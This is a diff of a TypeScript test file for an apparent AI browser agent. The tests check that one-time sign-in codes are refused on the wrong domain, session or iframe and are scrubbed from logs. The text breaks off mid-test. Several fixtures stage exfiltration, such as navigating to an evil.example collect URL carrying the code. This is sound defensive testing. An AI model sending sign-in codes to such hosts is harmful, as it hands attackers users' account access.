@@ -13,6 +13,7 @@ vi.mock('../../../../src/browser/human-behavior.js', () => ({
   jitteredDelay: vi.fn().mockResolvedValue(undefined),
   simulateHumanPresence: vi.fn().mockResolvedValue(undefined),
   humanClick: vi.fn().mockResolvedValue(undefined),
+  humanFocusField: vi.fn().mockResolvedValue(undefined),
   humanType: vi.fn().mockResolvedValue(undefined),
 }));
 
@@ -29,6 +30,10 @@ import { BrowserSession } from '../../../../src/browser/browser-session.js';
 import type { BrowserService } from '../../../../src/browser/browser-service.js';
 import type { ToolContext } from '../../../../src/skills/types.js';
 import type { BrowserContext, Page } from 'playwright';
+import { CodeTracker } from '../../../../src/verification/code-tracker.js';
+import type { VerificationRuntime } from '../../../../src/verification/index.js';
+import type { Verification } from '../../../../src/verification/types.js';
+import { focusProbe, isFocusedFrameHost } from './focus-frame.js';
 
 const logger = pino({ level: 'silent' });
 
@@ -1544,5 +1549,880 @@ describe('web-browser session_reused signal', () => {
     if (result.success) {
       expect('session_reused' in (result.data as object)).toBe(false);
     }
+  });
+});
+
+describe('web-browser sign-in verification (#2017)', () => {
+  const REFUSAL =
+    'refused: this page or frame is not the sign-in page this code belongs to, so it was not entered. ' +
+    'Enter it only in the code field of the sign-in page the verification was opened on.';
+  const CODE = '482913';
+
+  function verification(over: Partial<Verification>): Verification {
+    return {
+      id: 'v-1',
+      purpose: 'sign_in',
+      kind: 'code',
+      delivery: 'sms',
+      site: 'aircanada.com',
+      pageDomain: 'aircanada.com',
+      browserSessionId: 'sess-1',
+      taskId: null,
+      conversationId: null,
+      status: 'pending',
+      requestedAt: new Date('2026-10-19T12:00:00Z'),
+      expiresAt: new Date('2026-10-19T12:10:00Z'),
+      resolvedAt: null,
+      metadata: {},
+      ...over,
+    };
+  }
+
+  /** A runtime with a real CodeTracker and a canned listActive(). Only the members web-browser uses. */
+  function makeRuntime(active: Verification[]) {
+    const tracker = new CodeTracker({ ttlMinutesAfterClose: 120 });
+    const listActive = vi.fn().mockResolvedValue(active);
+    const runtime = { tracker, listActive } as unknown as VerificationRuntime;
+    return { runtime, tracker, listActive };
+  }
+
+  function verifyCtx(pageUrl: string, input: Record<string, unknown>, runtime: VerificationRuntime, sessionId = 'sess-1') {
+    const page = makeMockPage('page', vi.fn(), pageUrl);
+    const session = new BrowserSession({} as unknown as BrowserContext, page as unknown as Page);
+    const browserService = {
+      getOrCreateSession: vi.fn().mockResolvedValue({ sessionId, session }),
+      closeSession: vi.fn().mockResolvedValue(undefined),
+    } as unknown as BrowserService;
+    const ctx = { input, log: logger, browserService, verification: runtime } as unknown as ToolContext;
+    return { ctx, page, session };
+  }
+
+  it('type of a tracked code on its page_domain succeeds and registers it', async () => {
+    const v = verification({});
+    const { runtime, tracker } = makeRuntime([v]);
+    tracker.register(v.id, v.pageDomain, CODE, v.browserSessionId);
+    const register = vi.spyOn(tracker, 'register');
+    const { ctx, session } = verifyCtx('https://login.aircanada.com/mfa', { action: 'type', selector: '#code', text: CODE }, runtime);
+
+    const result = await new WebBrowserHandler().execute(ctx);
+
+    expect(result.success).toBe(true);
+    expect(vi.mocked(humanType)).toHaveBeenCalledWith(expect.anything(), CODE, expect.anything());
+    expect(register).toHaveBeenCalledWith('v-1', 'aircanada.com', CODE, 'sess-1');
+    // The session now scrubs the code from anything it reads back.
+    expect(session.redactInjectedSecrets(`code ${CODE}`)).not.toContain(CODE);
+  });
+
+  it('allows page_domain of an IdP and refuses a lookalike', async () => {
+    // The service stores page_domain as the registrable domain of the challenge page.
+    const v = verification({ site: 'manulife.ca', pageDomain: 'b2clogin.com' });
+    const { runtime, tracker } = makeRuntime([v]);
+    tracker.register(v.id, v.pageDomain, CODE, v.browserSessionId);
+
+    const ok = await new WebBrowserHandler().execute(
+      verifyCtx('https://manulife.b2clogin.com/mfa', { action: 'type', selector: '#code', text: CODE }, runtime).ctx,
+    );
+    expect(ok.success).toBe(true);
+    expect(vi.mocked(humanType)).toHaveBeenCalledTimes(1);
+
+    vi.mocked(humanType).mockClear();
+    const refused = await new WebBrowserHandler().execute(
+      verifyCtx('https://manulife-login.com/mfa', { action: 'type', selector: '#code', text: CODE }, runtime).ctx,
+    );
+    expect(refused).toEqual({ success: false, error: REFUSAL });
+    expect(vi.mocked(humanType)).not.toHaveBeenCalled();
+  });
+
+  it('value tracked for A is refused on B\'s page_domain', async () => {
+    const a = verification({ id: 'v-a', site: 'aircanada.com', pageDomain: 'aircanada.com' });
+    const b = verification({ id: 'v-b', site: 'manulife.ca', pageDomain: 'manulife.ca' });
+    const { runtime, tracker } = makeRuntime([a, b]);
+    tracker.register(a.id, a.pageDomain, CODE, a.browserSessionId);
+    const register = vi.spyOn(tracker, 'register');
+
+    // A code embedded in longer text is still caught.
+    const result = await new WebBrowserHandler().execute(
+      verifyCtx('https://www.manulife.ca/verify', { action: 'type', selector: '#code', text: `code: ${CODE}` }, runtime).ctx,
+    );
+
+    expect(result).toEqual({ success: false, error: REFUSAL });
+    expect(JSON.stringify(result)).not.toContain(CODE);
+    expect(vi.mocked(humanType)).not.toHaveBeenCalled();
+    expect(register).not.toHaveBeenCalled();
+  });
+
+  describe('two verifications on one identity provider are told apart by browser session', () => {
+    const CODE_A = '482913';
+    const CODE_B = '739204';
+    function twoOnB2c() {
+      const a = verification({ id: 'v-a', site: 'manulife.ca', pageDomain: 'b2clogin.com', browserSessionId: 'sess-a' });
+      const b = verification({ id: 'v-b', site: 'sunlife.ca', pageDomain: 'b2clogin.com', browserSessionId: 'sess-b' });
+      const { runtime, tracker } = makeRuntime([a, b]);
+      tracker.register(a.id, a.pageDomain, CODE_A, a.browserSessionId);
+      tracker.register(b.id, b.pageDomain, CODE_B, b.browserSessionId);
+      return runtime;
+    }
+
+    it('refuses A\'s code typed in B\'s session, and allows it in A\'s', async () => {
+      const runtime = twoOnB2c();
+      const refused = await new WebBrowserHandler().execute(
+        verifyCtx('https://sunlife.b2clogin.com/mfa', { action: 'type', selector: '#code', text: CODE_A }, runtime, 'sess-b').ctx,
+      );
+      expect(refused).toEqual({ success: false, error: REFUSAL });
+      expect(vi.mocked(humanType)).not.toHaveBeenCalled();
+
+      const ok = await new WebBrowserHandler().execute(
+        verifyCtx('https://manulife.b2clogin.com/mfa', { action: 'type', selector: '#code', text: CODE_A }, runtime, 'sess-a').ctx,
+      );
+      expect(ok.success).toBe(true);
+      expect(vi.mocked(humanType)).toHaveBeenCalledWith(expect.anything(), CODE_A, expect.anything());
+    });
+
+    it('a code typed in B\'s session is tracked for B only, so it is then refused in A\'s session', async () => {
+      const a = verification({ id: 'v-a', site: 'manulife.ca', pageDomain: 'b2clogin.com', browserSessionId: 'sess-a' });
+      const b = verification({ id: 'v-b', site: 'sunlife.ca', pageDomain: 'b2clogin.com', browserSessionId: 'sess-b' });
+      const { runtime, tracker } = makeRuntime([a, b]);
+      const register = vi.spyOn(tracker, 'register');
+
+      const typed = await new WebBrowserHandler().execute(
+        verifyCtx('https://sunlife.b2clogin.com/mfa', { action: 'type', selector: '#code', text: CODE_B }, runtime, 'sess-b').ctx,
+      );
+      expect(typed.success).toBe(true);
+      expect(register.mock.calls.map((c) => c[0])).toEqual(['v-b']);
+
+      vi.mocked(humanType).mockClear();
+      const refused = await new WebBrowserHandler().execute(
+        verifyCtx('https://manulife.b2clogin.com/mfa', { action: 'type', selector: '#code', text: CODE_B }, runtime, 'sess-a').ctx,
+      );
+      expect(refused).toEqual({ success: false, error: REFUSAL });
+      expect(vi.mocked(humanType)).not.toHaveBeenCalled();
+    });
+
+    it('refuses a navigate carrying A\'s code in B\'s session, and allows it in A\'s', async () => {
+      const runtime = twoOnB2c();
+      const url = `https://manulife.b2clogin.com/verify?c=${CODE_A}`;
+      const refused = verifyCtx('https://sunlife.b2clogin.com/mfa', { action: 'navigate', url }, runtime, 'sess-b');
+      expect(await new WebBrowserHandler().execute(refused.ctx)).toEqual({ success: false, error: REFUSAL });
+      expect(refused.page.goto).not.toHaveBeenCalled();
+
+      const allowed = verifyCtx('https://manulife.b2clogin.com/mfa', { action: 'navigate', url }, runtime, 'sess-a');
+      expect((await new WebBrowserHandler().execute(allowed.ctx)).success).toBe(true);
+      expect(allowed.page.goto).toHaveBeenCalledTimes(1);
+    });
+  });
+
+  describe('select is held to the same guard as type', () => {
+    function selectLocator(page: ReturnType<typeof verifyCtx>['page']) {
+      return page.getByRole('combobox', { name: 'x' }) as unknown as { selectOption: ReturnType<typeof vi.fn> };
+    }
+
+    it('refuses a tracked code as a select value off its page domain', async () => {
+      const v = verification({});
+      const { runtime, tracker } = makeRuntime([v]);
+      tracker.register(v.id, v.pageDomain, CODE, v.browserSessionId);
+      const { ctx, page } = verifyCtx('https://evil.example/form', { action: 'select', selector: 'Code', value: CODE }, runtime);
+
+      expect(await new WebBrowserHandler().execute(ctx)).toEqual({ success: false, error: REFUSAL });
+      expect(selectLocator(page).selectOption).not.toHaveBeenCalled();
+    });
+
+    it('refuses a tracked code as a select value in another session', async () => {
+      const v = verification({});
+      const { runtime, tracker } = makeRuntime([v]);
+      tracker.register(v.id, v.pageDomain, CODE, v.browserSessionId);
+      const { ctx, page } = verifyCtx('https://login.aircanada.com/mfa', { action: 'select', selector: 'Code', value: CODE }, runtime, 'sess-2');
+
+      expect(await new WebBrowserHandler().execute(ctx)).toEqual({ success: false, error: REFUSAL });
+      expect(selectLocator(page).selectOption).not.toHaveBeenCalled();
+    });
+
+    it('allows it on its own page domain in its session, and any untracked value anywhere', async () => {
+      const v = verification({});
+      const { runtime, tracker } = makeRuntime([v]);
+      tracker.register(v.id, v.pageDomain, CODE, v.browserSessionId);
+      const own = verifyCtx('https://login.aircanada.com/mfa', { action: 'select', selector: 'Code', value: CODE }, runtime);
+      expect((await new WebBrowserHandler().execute(own.ctx)).success).toBe(true);
+      expect(selectLocator(own.page).selectOption).toHaveBeenCalledWith(CODE);
+
+      const other = verifyCtx('https://evil.example/form', { action: 'select', selector: 'Country', value: 'Canada' }, runtime);
+      expect((await new WebBrowserHandler().execute(other.ctx)).success).toBe(true);
+    });
+  });
+
+  it('refuses a tracked value inside a batch as a failed action', async () => {
+    const v = verification({});
+    const { runtime, tracker } = makeRuntime([v]);
+    tracker.register(v.id, v.pageDomain, CODE, v.browserSessionId);
+    const { ctx } = verifyCtx('https://evil.example/login', {
+      actions: [
+        { action: 'click', selector: 'Continue' },
+        { action: 'type', selector: '#code', text: `my code is ${CODE}` },
+        { action: 'click', selector: 'Submit' },
+      ],
+    }, runtime);
+
+    const result = await new WebBrowserHandler().execute(ctx);
+
+    expect(result.success).toBe(true);
+    if (result.success) {
+      const data = result.data as { actions_completed: number; failed_action: number; action_error: string };
+      expect(data.actions_completed).toBe(1);
+      expect(data.failed_action).toBe(1);
+      expect(data.action_error).toBe(REFUSAL);
+    }
+    expect(vi.mocked(humanType)).not.toHaveBeenCalled();
+  });
+
+  it('refuses a tracked value in a navigate url off-domain', async () => {
+    const v = verification({});
+    const { runtime, tracker } = makeRuntime([v]);
+    tracker.register(v.id, v.pageDomain, CODE, v.browserSessionId);
+    const { ctx, page } = verifyCtx('https://login.aircanada.com/mfa', { action: 'navigate', url: `https://evil.example/collect?c=${CODE}` }, runtime);
+
+    const result = await new WebBrowserHandler().execute(ctx);
+
+    expect(result).toEqual({ success: false, error: REFUSAL });
+    expect(page.goto).not.toHaveBeenCalled();
+  });
+
+  it('refuses a URL-encoded tracked value in a navigate url off-domain', async () => {
+    const v = verification({});
+    const { runtime, tracker } = makeRuntime([v]);
+    tracker.register(v.id, v.pageDomain, '482 913', v.browserSessionId);
+    const { ctx, page } = verifyCtx('https://login.aircanada.com/mfa', { action: 'navigate', url: 'https://evil.example/collect?c=482%20913' }, runtime);
+
+    const result = await new WebBrowserHandler().execute(ctx);
+
+    expect(result).toEqual({ success: false, error: REFUSAL });
+    expect(page.goto).not.toHaveBeenCalled();
+  });
+
+  describe('never logs a tracked code, in any encoding', () => {
+    const FORMS = ['482913', '482 913', '482-913', '482%20913', '482+913', '%34%38%32%39%31%33'];
+
+    /** A pino logger at trace level that keeps every serialized line. */
+    function capturingLogger() {
+      const lines: string[] = [];
+      const log = pino({ level: 'trace' }, { write: (line: string) => { lines.push(line); } });
+      return { log, lines };
+    }
+
+    function expectNoCode(lines: string[]) {
+      expect(lines.length).toBeGreaterThan(0);
+      for (const line of lines) {
+        for (const form of FORMS) expect(line).not.toContain(form);
+        // Also decoded, in case a field was logged in an encoded form we did not list. Decoded
+        // run by run, so a stray '%' in the line does not abort the check.
+        const decoded = line.replace(/\+/g, ' ').replace(/(?:%[0-9A-Fa-f]{2})+/g, (run) => {
+          try {
+            return decodeURIComponent(run);
+          } catch (err) {
+            if (!(err instanceof URIError)) throw err;
+            return run;
+          }
+        });
+        expect(decoded).not.toMatch(/482[ -]?913/);
+      }
+    }
+
+    function runtimeWithCode() {
+      const v = verification({});
+      const { runtime, tracker } = makeRuntime([v]);
+      tracker.register(v.id, v.pageDomain, CODE, v.browserSessionId);
+      return runtime;
+    }
+
+    it.each(FORMS)('refused off-domain navigate with c=%s logs no code', async (form) => {
+      const { log, lines } = capturingLogger();
+      const { ctx } = verifyCtx('https://login.aircanada.com/mfa', { action: 'navigate', url: `https://evil.example/collect?c=${form}` }, runtimeWithCode());
+      (ctx as unknown as { log: unknown }).log = log;
+
+      const result = await new WebBrowserHandler().execute(ctx);
+
+      expect(result).toEqual({ success: false, error: REFUSAL });
+      expectNoCode(lines);
+    });
+
+    it.each(FORMS)('allowed navigate with c=%s that hits a block logs no code', async (form) => {
+      const { log, lines } = capturingLogger();
+      // A hard-block title drives both the soft-block reload log and the hard-block log.
+      const page = makeMockPage('', vi.fn(), 'https://login.aircanada.com/mfa', { title: 'Access Denied' });
+      const session = new BrowserSession({} as unknown as BrowserContext, page as unknown as Page);
+      const browserService = {
+        getOrCreateSession: vi.fn().mockResolvedValue({ sessionId: 'sess-1', session }),
+        closeSession: vi.fn().mockResolvedValue(undefined),
+      } as unknown as BrowserService;
+      const ctx = {
+        input: { action: 'navigate', url: `https://login.aircanada.com/verify?c=${form}` },
+        log,
+        browserService,
+        verification: runtimeWithCode(),
+      } as unknown as ToolContext;
+
+      const result = await new WebBrowserHandler().execute(ctx);
+
+      expect(result.success).toBe(false);
+      expect(page.goto).toHaveBeenCalledTimes(1);
+      expectNoCode(lines);
+      // The URL is still logged, with the code replaced.
+      const blockLines = lines.filter((l) => l.includes('hard edge block') || l.includes('Soft block suspected'));
+      expect(blockLines).toHaveLength(2);
+      for (const l of blockLines) expect(l).toContain('[sign-in code]');
+    });
+
+    it.each(FORMS)('a failed action whose error quotes c=%s logs and returns no code', async (form) => {
+      const { log, lines } = capturingLogger();
+      const { ctx, page } = verifyCtx('https://login.aircanada.com/mfa', { action: 'navigate', url: `https://login.aircanada.com/verify?c=${form}` }, runtimeWithCode());
+      (ctx as unknown as { log: unknown }).log = log;
+      // Playwright quotes the URL it failed on, in its message and its stack; a stray '%'
+      // elsewhere in the text must not stop the encoded forms being found.
+      const err = new Error(`page.goto: net::ERR_ABORTED (100% fail) at https://login.aircanada.com/verify?c=${form}`);
+      err.stack = `${err.message}\n    at navigate (handler.ts:1:1)`;
+      page.goto.mockRejectedValueOnce(err);
+
+      const result = await new WebBrowserHandler().execute(ctx);
+
+      expect(result.success).toBe(false);
+      const failedLines = lines.filter((l) => l.includes('Browser action failed'));
+      expect(failedLines).toHaveLength(1);
+      expect(failedLines[0]).toContain('[sign-in code]');
+      expectNoCode(lines);
+      const returned = JSON.stringify(result);
+      for (const f of FORMS) expect(returned).not.toContain(f);
+    });
+  });
+
+  it('allows a tracked value in a navigate url to its own page_domain', async () => {
+    const v = verification({});
+    const { runtime, tracker } = makeRuntime([v]);
+    tracker.register(v.id, v.pageDomain, CODE, v.browserSessionId);
+    const { ctx, page } = verifyCtx('https://login.aircanada.com/mfa', { action: 'navigate', url: `https://login.aircanada.com/verify?c=${CODE}` }, runtime);
+
+    const result = await new WebBrowserHandler().execute(ctx);
+
+    expect(result.success).toBe(true);
+    expect(page.goto).toHaveBeenCalledTimes(1);
+  });
+
+  it('typing a 4-digit code on a verification page_domain registers it', async () => {
+    const v = verification({});
+    const { runtime, tracker } = makeRuntime([v]);
+    const { ctx, session } = verifyCtx('https://login.aircanada.com/mfa', { action: 'type', selector: '#code', text: '4821' }, runtime);
+
+    const result = await new WebBrowserHandler().execute(ctx);
+
+    expect(result.success).toBe(true);
+    expect(tracker.allowedDomainsFor('4821')).toEqual(new Set(['aircanada.com']));
+    expect(session.redactInjectedSecrets('4821')).not.toContain('4821');
+  });
+
+  it('registers a typed code against every matching pending, expired or abandoned verification', async () => {
+    const pending = verification({ id: 'v-new' });
+    const expired = verification({ id: 'v-old', status: 'expired', resolvedAt: new Date('2026-10-19T11:00:00Z') });
+    const satisfied = verification({ id: 'v-done', status: 'satisfied', resolvedAt: new Date('2026-10-19T11:00:00Z') });
+    const other = verification({ id: 'v-other', site: 'manulife.ca', pageDomain: 'manulife.ca' });
+    const { runtime, tracker } = makeRuntime([pending, expired, satisfied, other]);
+    const register = vi.spyOn(tracker, 'register');
+    const closed = vi.spyOn(tracker, 'closed');
+
+    await new WebBrowserHandler().execute(
+      verifyCtx('https://login.aircanada.com/mfa', { action: 'type', selector: '#code', text: CODE }, runtime).ctx,
+    );
+
+    expect(register.mock.calls.map((c) => c[0]).sort()).toEqual(['v-new', 'v-old']);
+    // The expired row's values start aging at once.
+    expect(closed.mock.calls.map((c) => c[0])).toEqual(['v-old']);
+  });
+
+  it('typing a code on a page whose only verification is satisfied registers nothing', async () => {
+    const satisfied = verification({ id: 'v-done', status: 'satisfied', resolvedAt: new Date('2026-10-19T11:00:00Z') });
+    const { runtime, tracker } = makeRuntime([satisfied]);
+    const { ctx, session } = verifyCtx('https://login.aircanada.com/mfa', { action: 'type', selector: '#code', text: CODE }, runtime);
+
+    const result = await new WebBrowserHandler().execute(ctx);
+
+    expect(result.success).toBe(true);
+    expect(tracker.size()).toBe(0);
+    expect(session.redactInjectedSecrets(CODE)).toBe(CODE);
+  });
+
+  it('typing a non-code string registers nothing', async () => {
+    const v = verification({});
+    const { runtime, tracker, listActive } = makeRuntime([v]);
+    const { ctx } = verifyCtx('https://login.aircanada.com/mfa', { action: 'type', selector: '#email', text: 'joseph@josephfung.ca' }, runtime);
+
+    const result = await new WebBrowserHandler().execute(ctx);
+
+    expect(result.success).toBe(true);
+    expect(tracker.size()).toBe(0);
+    expect(listActive).not.toHaveBeenCalled();
+  });
+
+  it('typing a code on a page no verification names registers nothing', async () => {
+    const v = verification({});
+    const { runtime, tracker } = makeRuntime([v]);
+    const { ctx, session } = verifyCtx('https://shop.example.com/cart', { action: 'type', selector: '#qty', text: '2026' }, runtime);
+
+    const result = await new WebBrowserHandler().execute(ctx);
+
+    expect(result.success).toBe(true);
+    expect(tracker.size()).toBe(0);
+    expect(session.redactInjectedSecrets('2026')).toBe('2026');
+  });
+
+  it('does not track a code whose typing failed', async () => {
+    const v = verification({});
+    const { runtime, tracker } = makeRuntime([v]);
+    vi.mocked(humanType).mockRejectedValueOnce(new Error('element detached'));
+    const { ctx } = verifyCtx('https://login.aircanada.com/mfa', { action: 'type', selector: '#code', text: CODE }, runtime);
+
+    const result = await new WebBrowserHandler().execute(ctx);
+
+    expect(result.success).toBe(false);
+    expect(tracker.size()).toBe(0);
+  });
+
+  it('still scrubs the typed code from the session when the verification lookup fails', async () => {
+    const { runtime, tracker, listActive } = makeRuntime([]);
+    listActive.mockRejectedValueOnce(new Error('db down'));
+    const { ctx, session } = verifyCtx('https://login.aircanada.com/mfa', { action: 'type', selector: '#code', text: CODE }, runtime);
+
+    const result = await new WebBrowserHandler().execute(ctx);
+
+    expect(result.success).toBe(true);
+    expect(tracker.size()).toBe(0);
+    expect(session.redactInjectedSecrets(CODE)).not.toContain(CODE);
+  });
+
+  describe('a field inside a child frame is judged by that frame, not the top page', () => {
+    /**
+     * A page on `topUrl` whose only matching field lives in a child frame on `frameUrl`:
+     * every top-level locator misses, the child frame's role locator matches.
+     */
+    function framedCtx(
+      topUrl: string,
+      frameUrl: string,
+      input: Record<string, unknown>,
+      runtime: VerificationRuntime,
+      // A frame between the top page and the field's frame (the field's parentFrame()).
+      parentUrl?: string,
+    ) {
+      const miss = { count: vi.fn().mockResolvedValue(0), first: vi.fn().mockReturnThis() };
+      const hit = { count: vi.fn().mockResolvedValue(1), first: vi.fn().mockReturnThis(), isVisible: vi.fn().mockResolvedValue(true) };
+      const scope = (url: string, matches: boolean) => ({
+        url: vi.fn().mockReturnValue(url),
+        name: vi.fn().mockReturnValue(''),
+        evaluate: vi.fn().mockResolvedValue(''),
+        getByRole: vi.fn().mockReturnValue(matches ? hit : miss),
+        getByLabel: vi.fn().mockReturnValue(miss),
+        getByText: vi.fn().mockReturnValue(miss),
+        locator: vi.fn().mockReturnValue(miss),
+      });
+      const mainFrame = { ...scope(topUrl, false), parentFrame: vi.fn().mockReturnValue(null) };
+      const middle = parentUrl === undefined ? null : { ...scope(parentUrl, false), parentFrame: vi.fn().mockReturnValue(mainFrame) };
+      const childFrame = { ...scope(frameUrl, true), parentFrame: vi.fn().mockReturnValue(middle ?? mainFrame) };
+      const page = {
+        ...makeMockPage('page', vi.fn(), topUrl),
+        getByRole: vi.fn().mockReturnValue(miss),
+        getByLabel: vi.fn().mockReturnValue(miss),
+        getByText: vi.fn().mockReturnValue(miss),
+        locator: vi.fn().mockReturnValue(miss),
+        frames: vi.fn().mockReturnValue(middle ? [mainFrame, middle, childFrame] : [mainFrame, childFrame]),
+        mainFrame: vi.fn().mockReturnValue(mainFrame),
+      };
+      const session = new BrowserSession({} as unknown as BrowserContext, page as unknown as Page);
+      const browserService = {
+        getOrCreateSession: vi.fn().mockResolvedValue({ sessionId: 'sess-1', session }),
+        closeSession: vi.fn().mockResolvedValue(undefined),
+      } as unknown as BrowserService;
+      return { input, log: logger, browserService, verification: runtime } as unknown as ToolContext;
+    }
+
+    it('refuses a tracked code whose field is in a third-party iframe on the right top page', async () => {
+      const v = verification({});
+      const { runtime, tracker } = makeRuntime([v]);
+      tracker.register(v.id, v.pageDomain, CODE, v.browserSessionId);
+
+      const result = await new WebBrowserHandler().execute(
+        framedCtx('https://www.aircanada.com/mfa', 'https://chat.widgetvendor.com/frame', { action: 'type', selector: 'code', text: CODE }, runtime),
+      );
+
+      expect(result).toEqual({ success: false, error: REFUSAL });
+      expect(vi.mocked(humanType)).not.toHaveBeenCalled();
+    });
+
+    it('refuses a tracked code into a hostile iframe when the verification kept the top-level domain', async () => {
+      // What verification open records for a code input in an iframe that is neither the
+      // site nor a configured identity provider: page_domain stays the top page's.
+      const v = verification({ site: 'manulife.ca', pageDomain: 'manulife.ca' });
+      const { runtime, tracker } = makeRuntime([v]);
+      tracker.register(v.id, v.pageDomain, CODE, v.browserSessionId);
+
+      const result = await new WebBrowserHandler().execute(
+        framedCtx('https://www.manulife.ca/signin', 'https://ads.example/slot', { action: 'type', selector: 'code', text: CODE }, runtime),
+      );
+
+      expect(result).toEqual({ success: false, error: REFUSAL });
+      expect(vi.mocked(humanType)).not.toHaveBeenCalled();
+    });
+
+    it('allows a tracked code into a same-site child frame', async () => {
+      const v = verification({ site: 'manulife.ca', pageDomain: 'manulife.ca' });
+      const { runtime, tracker } = makeRuntime([v]);
+      tracker.register(v.id, v.pageDomain, CODE, v.browserSessionId);
+
+      const result = await new WebBrowserHandler().execute(
+        framedCtx('https://www.manulife.ca/signin', 'https://login.manulife.ca/otp', { action: 'type', selector: 'code', text: CODE }, runtime),
+      );
+
+      expect(result.success).toBe(true);
+    });
+
+    it('judges an inline (about:srcdoc) field by the nearest website frame above it', async () => {
+      const v = verification({ site: 'manulife.ca', pageDomain: 'manulife.ca' });
+      const { runtime, tracker } = makeRuntime([v]);
+      const register = vi.spyOn(tracker, 'register');
+
+      const ok = await new WebBrowserHandler().execute(
+        framedCtx('https://www.manulife.ca/signin', 'about:srcdoc', { action: 'type', selector: 'code', text: CODE }, runtime),
+      );
+      expect(ok.success).toBe(true);
+      expect(register).toHaveBeenCalledWith('v-1', 'manulife.ca', CODE, 'sess-1');
+
+      // An inline frame inside a third-party iframe belongs to that iframe's site.
+      vi.mocked(humanType).mockClear();
+      const refused = await new WebBrowserHandler().execute(
+        framedCtx('https://www.manulife.ca/signin', 'about:srcdoc', { action: 'type', selector: 'code', text: CODE }, runtime, 'https://ads.example/slot'),
+      );
+      expect(refused).toEqual({ success: false, error: REFUSAL });
+      expect(vi.mocked(humanType)).not.toHaveBeenCalled();
+    });
+
+    it('allows a tracked code into an identity-provider iframe the verification was opened on', async () => {
+      const v = verification({ site: 'manulife.ca', pageDomain: 'b2clogin.com' });
+      const { runtime, tracker } = makeRuntime([v]);
+      tracker.register(v.id, v.pageDomain, CODE, v.browserSessionId);
+
+      const result = await new WebBrowserHandler().execute(
+        framedCtx('https://www.manulife.ca/signin', 'https://manulife.b2clogin.com/mfa', { action: 'type', selector: 'code', text: CODE }, runtime),
+      );
+
+      expect(result.success).toBe(true);
+      expect(vi.mocked(humanType)).toHaveBeenCalledWith(expect.anything(), CODE, expect.anything());
+    });
+
+    it('tracks a typed code against the frame\'s domain', async () => {
+      const v = verification({ site: 'manulife.ca', pageDomain: 'b2clogin.com' });
+      const { runtime, tracker } = makeRuntime([v]);
+      const register = vi.spyOn(tracker, 'register');
+
+      const result = await new WebBrowserHandler().execute(
+        framedCtx('https://www.manulife.ca/signin', 'https://manulife.b2clogin.com/mfa', { action: 'type', selector: 'code', text: CODE }, runtime),
+      );
+
+      expect(result.success).toBe(true);
+      expect(register).toHaveBeenCalledWith('v-1', 'b2clogin.com', CODE, 'sess-1');
+    });
+  });
+
+  describe('press_key cannot spell a tracked code into the wrong frame', () => {
+    const KEY_REFUSAL =
+      'refused: a sign-in code is being handled and the focused field is not on the sign-in page of a ' +
+      'verification in this browser session, so no character was typed. Enter a code with type ' +
+      '(selector and text) on the sign-in page instead.';
+    const DIGITS = ['4', '8', '2', '9', '1', '3'];
+
+    /**
+     * A page on `topUrl` with one child frame on `childUrl`. `focusIn` says where keyboard
+     * focus sits: the main frame's document, the child frame's, or somewhere the probe
+     * cannot follow (a focused frame host no child frame claims).
+     */
+    function focusCtx(opts: {
+      topUrl: string;
+      childUrl: string;
+      focusIn: 'main' | 'child' | 'unresolvable';
+      input: Record<string, unknown>;
+      runtime: VerificationRuntime;
+      sessionId?: string;
+    }) {
+      const host = {
+        evaluate: vi.fn(async (fn: unknown) => fn === isFocusedFrameHost && opts.focusIn === 'child'),
+        dispose: vi.fn().mockResolvedValue(undefined),
+      };
+      const base = makeMockPage('page', vi.fn(), opts.topUrl);
+      const mainFrame = {
+        ...(base.mainFrame() as Record<string, unknown>),
+        url: vi.fn().mockReturnValue(opts.topUrl),
+        evaluate: vi.fn(async (fn: unknown) => (fn === focusProbe ? (opts.focusIn === 'main' ? 'element' : 'frame') : 'page')),
+        parentFrame: vi.fn().mockReturnValue(null),
+        childFrames: vi.fn(),
+      };
+      const childFrame = {
+        url: vi.fn().mockReturnValue(opts.childUrl),
+        name: vi.fn().mockReturnValue(''),
+        evaluate: vi.fn(async (fn: unknown) => (fn === focusProbe ? 'element' : '')),
+        frameElement: vi.fn().mockResolvedValue(host),
+        parentFrame: vi.fn().mockReturnValue(mainFrame),
+        childFrames: vi.fn().mockReturnValue([]),
+      };
+      mainFrame.childFrames.mockReturnValue([childFrame]);
+      const page = { ...base, frames: vi.fn().mockReturnValue([mainFrame, childFrame]), mainFrame: vi.fn().mockReturnValue(mainFrame) };
+      const session = new BrowserSession({} as unknown as BrowserContext, page as unknown as Page);
+      const browserService = {
+        getOrCreateSession: vi.fn().mockResolvedValue({ sessionId: opts.sessionId ?? 'sess-1', session }),
+        closeSession: vi.fn().mockResolvedValue(undefined),
+      } as unknown as BrowserService;
+      const ctx = { input: opts.input, log: logger, browserService, verification: opts.runtime } as unknown as ToolContext;
+      return { ctx, page };
+    }
+
+    function trackedRuntime() {
+      const v = verification({});
+      const made = makeRuntime([v]);
+      made.tracker.register(v.id, v.pageDomain, CODE, v.browserSessionId);
+      return made;
+    }
+
+    const keysBatch = (keys: string[]) => keys.map((key) => ({ action: 'press_key', key }));
+
+    it('refuses at the first key when focus is in a third-party iframe', async () => {
+      const { runtime } = trackedRuntime();
+      const { ctx, page } = focusCtx({
+        topUrl: 'https://login.aircanada.com/mfa',
+        childUrl: 'https://chat.widgetvendor.com/frame',
+        focusIn: 'child',
+        input: { actions: [{ action: 'click', selector: 'chat message box' }, ...keysBatch(DIGITS)] },
+        runtime,
+      });
+
+      const result = await new WebBrowserHandler().execute(ctx);
+
+      expect(result.success).toBe(true);
+      if (result.success) {
+        const data = result.data as { actions_completed: number; failed_action: number; action_error: string };
+        expect(data.actions_completed).toBe(1);
+        expect(data.failed_action).toBe(1);
+        expect(data.action_error).toBe(KEY_REFUSAL);
+      }
+      expect(page.keyboard.press).not.toHaveBeenCalled();
+      expect(JSON.stringify(result)).not.toContain(CODE);
+    });
+
+    it('allows the same keys on the verification\'s own page in its session', async () => {
+      const { runtime } = trackedRuntime();
+      const { ctx, page } = focusCtx({
+        topUrl: 'https://login.aircanada.com/mfa',
+        childUrl: 'https://chat.widgetvendor.com/frame',
+        focusIn: 'main',
+        input: { actions: keysBatch(DIGITS) },
+        runtime,
+      });
+
+      const result = await new WebBrowserHandler().execute(ctx);
+
+      expect(result.success).toBe(true);
+      expect(page.keyboard.press.mock.calls.map((c) => c[0])).toEqual(DIGITS);
+    });
+
+    it('allows keys into an identity-provider frame the verification was opened on', async () => {
+      const v = verification({ site: 'manulife.ca', pageDomain: 'b2clogin.com' });
+      const { runtime, tracker } = makeRuntime([v]);
